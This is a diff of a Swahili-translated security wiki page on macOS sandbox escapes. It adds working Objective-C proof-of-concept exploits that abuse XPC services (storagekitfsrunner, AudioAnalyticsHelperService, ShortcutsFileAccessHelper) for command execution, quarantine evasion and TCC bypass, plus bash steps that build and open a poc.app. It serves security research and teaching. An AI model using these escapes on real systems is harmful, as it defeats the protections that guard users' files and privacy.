@@ -24,11 +24,11 @@ Hii ndiyo iliyofanywa katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-
 > [!CAUTION]
 > Hivyo, kwa sasa, ikiwa unaweza tu kuunda folda yenye jina linalomalizika na **`.app`** bila sifa ya karantini, unaweza kutoroka sandbox kwa sababu macOS inachunguza tu **sifa ya karantini** katika **folda ya `.app`** na katika **kifurushi kikuu** (na tutaanika kifurushi kikuu kwa **`/bin/bash`**).
 >
-> Kumbuka kwamba ikiwa kifurushi cha .app tayari kimeidhinishwa kuendesha (kimekuwa na xttr ya karantini yenye bendera ya kuidhinishwa kuendesha), unaweza pia kukitumia... isipokuwa sasa huwezi kuandika ndani ya **kifurushi cha .app** isipokuwa una baadhi ya ruhusa za TCC zenye mamlaka (ambazo huna ndani ya sandbox ya juu).
+> Kumbuka kwamba ikiwa kifurushi cha .app tayari kimeidhinishwa kuendesha (kimekuwa na xttr ya karantini yenye bendera ya kuidhinishwa kuendesha), unaweza pia kutumia... isipokuwa sasa huwezi kuandika ndani ya **`.app`** bundles isipokuwa una baadhi ya ruhusa za TCC zenye mamlaka (ambazo huna ndani ya sandbox ya juu).
 
 ### Abusing Open functionality
 
-Katika [**mfano wa mwisho wa kutoroka sandbox ya Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) inaweza kuonekana jinsi **`open`** cli inaweza kutumika vibaya ili kutoroka sandbox.
+Katika [**esempe za mwisho za kutoroka sandbox ya Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) inaweza kuonekana jinsi **`open`** cli functionality inaweza kutumika vibaya ili kutoroka sandbox.
 
 {{#ref}}
 macos-office-sandbox-bypasses.md
@@ -37,11 +37,11 @@ macos-office-sandbox-bypasses.md
 ### Launch Agents/Daemons
 
 Hata kama programu ime **kusudiwa kuwa sandboxed** (`com.apple.security.app-sandbox`), inawezekana kupita sandbox ikiwa itatekelezwa kutoka kwa LaunchAgent (`~/Library/LaunchAgents`) kwa mfano.\
-Kama ilivyoelezwa katika [**hiki chapisho**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ikiwa unataka kupata kudumu na programu ambayo ime sandboxed unaweza kuifanya itekelezwe kiotomatiki kama LaunchAgent na labda kuingiza msimbo mbaya kupitia mabadiliko ya mazingira ya DyLib.
+Kama ilivyoelezwa katika [**hiki chapisho**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ikiwa unataka kupata kudumu na programu ambayo inasandboxed unaweza kufanya iwetekelezwe kiotomatiki kama LaunchAgent na labda kuingiza msimbo mbaya kupitia mabadiliko ya mazingira ya DyLib.
 
 ### Abusing Auto Start Locations
 
-Ikiwa mchakato wa sandboxed unaweza **kuandika** mahali ambapo **baadaye programu isiyo na sandbox itakimbia binary**, itakuwa na uwezo wa **kutoroka kwa kuweka** hapo binary. Mfano mzuri wa aina hii ya maeneo ni `~/Library/LaunchAgents` au `/System/Library/LaunchDaemons`.
+Ikiwa mchakato wa sandboxed unaweza **kuandika** mahali ambapo **baadaye programu isiyo na sandbox itakapoendesha binary**, itakuwa na uwezo wa **kutoroka kwa kuweka** hapo binary. Mfano mzuri wa aina hii ya maeneo ni `~/Library/LaunchAgents` au `/System/Library/LaunchDaemons`.
 
 Kwa hili unaweza hata kuhitaji **hatua 2**: Kufanya mchakato wenye **sandbox yenye ruhusa zaidi** (`file-read*`, `file-write*`) kutekeleza msimbo wako ambao kwa kweli utaandika mahali ambapo itatekelezwa **bila sandbox**.
 
@@ -53,18 +53,162 @@ Angalia ukurasa huu kuhusu **Auto Start locations**:
 
 ### Abusing other processes
 
-Ikiwa kutoka kwa mchakato wa sandbox unaweza **kuathiri michakato mingine** inayokimbia katika sandboxes zenye vizuizi vidogo (au hakuna), utaweza kutoroka kwenye sandboxes zao:
+Ikiwa kutoka kwa mchakato wa sandbox unaweza **kuathiri michakato mingine** inayofanya kazi katika sandboxes zenye vizuizi vidogo (au hakuna), utaweza kutoroka kwenye sandboxes zao:
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
+### Available System and User Mach services
+
+Sandbox pia inaruhusu kuwasiliana na **Huduma za Mach** fulani kupitia XPC zilizofafanuliwa katika profaili `application.sb`. Ikiwa utaweza **kutumia** moja ya hizi huduma unaweza kuwa na uwezo wa **kutoroka sandbox**.
+
+Kama ilivyoonyeshwa katika [hiki andiko](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), taarifa kuhusu huduma za Mach inahifadhiwa katika `/System/Library/xpc/launchd.plist`. Inawezekana kupata huduma zote za System na User Mach kwa kutafuta ndani ya faili hiyo kwa `<string>System</string>` na `<string>User</string>`.
+
+Zaidi ya hayo, inawezekana kuangalia ikiwa huduma ya Mach inapatikana kwa programu ya sandboxed kwa kuita `bootstrap_look_up`:
+```objectivec
+void checkService(const char *serviceName) {
+mach_port_t service_port = MACH_PORT_NULL;
+kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+if (!err) {
+NSLog(@"available service:%s", serviceName);
+mach_port_deallocate(mach_task_self_, service_port);
+}
+}
+
+void print_available_xpc(void) {
+NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+for (NSString* key in launchDaemons) {
+NSDictionary<NSString*, id>* job = launchDaemons[key];
+NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+for (NSString* serviceName in machServices) {
+checkService(serviceName.UTF8String);
+}
+}
+}
+```
+### Available PID Mach services
+
+Huduma hizi za Mach zilikuwa za kwanza kutumika vibaya ili [kutoroka kutoka kwenye sandbox katika andiko hili](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Wakati huo, **huduma zote za XPC zinazohitajika** na programu na mfumo wake zilionekana katika eneo la PID la programu (hizi ni Huduma za Mach zikiwa na `ServiceType` kama `Application`).
+
+Ili **kuwasiliana na huduma ya XPC ya PID Domain**, inahitajika tu kuisajili ndani ya programu kwa mstari kama:
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+Zaidi ya hayo, inawezekana kupata huduma zote za **Application** Mach kwa kutafuta ndani ya `System/Library/xpc/launchd.plist` kwa `<string>Application</string>`.
+
+Njia nyingine ya kupata huduma halali za xpc ni kuangalia zile katika:
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+Kadhaa ya mifano inayotumia mbinu hii yanaweza kupatikana katika [**andiko la awali**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), hata hivyo, yafuatayo ni baadhi ya mifano iliyofupishwa.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+Huduma hii inaruhusu kila muunganisho wa XPC kwa kurudisha kila wakati `YES` na mbinu `runTask:arguments:withReply:` inatekeleza amri yoyote na vigezo vya kiholela.
+
+Ushambuliaji ulikuwa "rahisi kama":
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+[conn resume];
+
+[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+NSLog(@"run task result:%@, error:%@", bSucc, error);
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+Huduma hii ya XPC iliruhusu kila mteja kwa kurudi kila wakati YES na njia `createZipAtPath:hourThreshold:withReply:` kimsingi iliruhusu kuashiria njia ya folda ya kubana na itabana katika faili la ZIP.
+
+Kwa hivyo, inawezekana kuunda muundo wa folda ya programu bandia, kuibana, kisha kuibua na kuitekeleza ili kutoroka sandbox kwani faili mpya hazitakuwa na sifa ya karantini.
+
+Ushambuliaji ulikuwa:
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+NSString *currentPath = NSTemporaryDirectory();
+chdir([currentPath UTF8String]);
+NSLog(@"======== preparing payload at the current path:%@", currentPath);
+system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+[conn resume];
+
+[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+NSString *file;
+while ((file = [dirEnum nextObject])) {
+if ([[file pathExtension] isEqualToString: @"zip"]) {
+// open the zip
+NSString *cmd = [@"open " stringByAppendingString:file];
+system([cmd UTF8String]);
+
+sleep(3); // wait for decompression and then open the payload (poc.app)
+NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+system([cmd2 UTF8String]);
+break;
+}
+}
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+Huduma hii ya XPC inaruhusu kutoa ufikiaji wa kusoma na kuandika kwa URL yoyote kwa mteja wa XPC kupitia njia `extendAccessToURL:completion:` ambayo inakubali muunganisho wowote. Kwa kuwa huduma ya XPC ina FDA, inawezekana kutumia ruhusa hizi kukwepa TCC kabisa.
+
+Ushambuliaji ulikuwa:
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+[conn resume];
+
+[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+NSURL *targetURL = [fpWrapper url];
+
+void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+else {
+NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+}
+}];
+}
+```
 ### Static Compiling & Dynamically linking
 
-[**Utafiti huu**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) uligundua njia 2 za kutoroka Sandbox. Kwa sababu sandbox inatumika kutoka userland wakati maktaba ya **libSystem** inapopakiwa. Ikiwa binary inaweza kuepuka kupakia, haitakuwa na sandbox kamwe:
+[**Utafiti huu**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) uligundua njia 2 za kupita Sandbox. Kwa sababu sandbox inatumika kutoka userland wakati maktaba ya **libSystem** inapoloadiwa. Ikiwa binary inaweza kuepuka kuiload, haitapata sandbox kamwe:
 
-- Ikiwa binary ilikuwa **imeandikwa kwa njia ya statically kabisa**, inaweza kuepuka kupakia maktaba hiyo.
-- Ikiwa **binary haitahitaji kupakia maktaba yoyote** (kwa sababu linker pia yuko katika libSystem), haitahitaji kupakia libSystem.
+- Ikiwa binary ilikuwa **imeundwa kabisa kwa statically**, inaweza kuepuka kuiload maktaba hiyo.
+- Ikiwa **binary haitahitaji kuiload maktaba yoyote** (kwa sababu linker pia iko katika libSystem), haitahitaji kuiload libSystem.
 
 ### Shellcodes
 
@@ -73,9 +217,26 @@ Kumbuka kwamba **hata shellcodes** katika ARM64 zinahitaji kuunganishwa katika `
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Entitlements
+### Vizuwi visivyorithishwa
 
-Kumbuka kwamba hata kama baadhi ya **vitendo** vinaweza kuwa **vinavyoruhusiwa na sandbox** ikiwa programu ina **entitlement** maalum, kama ilivyo katika:
+Kama ilivyoelezwa katika **[bonus of this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** vizuwi vya sandbox kama:
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+inaweza kupuuziliwa mbali na mchakato mpya ukitekeleza kwa mfano:
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+Hata hivyo, bila shaka, mchakato huu mpya hautarithi haki au mamlaka kutoka kwa mchakato wa mzazi.
+
+### Haki
+
+Kumbuka kwamba hata kama baadhi ya **vitendo** vinaweza kuwa **vinavyoruhusiwa na sanduku** ikiwa programu ina **haki** maalum, kama ilivyo:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -163,7 +324,7 @@ Sandbox Bypassed!
 ```
 ### Debug & bypass Sandbox with lldb
 
-Tuweke programu ambayo inapaswa kuwekwa kwenye sanduku:
+Tukutane na programu ambayo inapaswa kuwekwa kwenye sandbox:
 
 {{#tabs}}
 {{#tab name="sand.c"}}
@@ -212,7 +373,7 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
 > [!CAUTION]
 > Programu itajaribu **kusoma** faili **`~/Desktop/del.txt`**, ambayo **Sandbox haitaruhusu**.\
-> Unda faili huko kwani mara Sandbox itakapovukwa, itakuwa na uwezo wa kuisoma:
+> Unda faili hapo kwani mara Sandbox itakapovukwa, itakuwa na uwezo wa kuisoma:
 >
 > ```bash
 > echo "Sandbox Bypassed" > ~/Desktop/del.txt
@@ -295,7 +456,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-> [!WARNING] > **Hata kama Sandbox imepita TCC** itauliza mtumiaji kama anataka kuruhusu mchakato kusoma faili kutoka desktop
+> [!WARNING] > **Hata kama Sandbox imeepukwa TCC** itauliza mtumiaji kama anataka kuruhusu mchakato kusoma faili kutoka kwenye desktop
 
 ## References
 
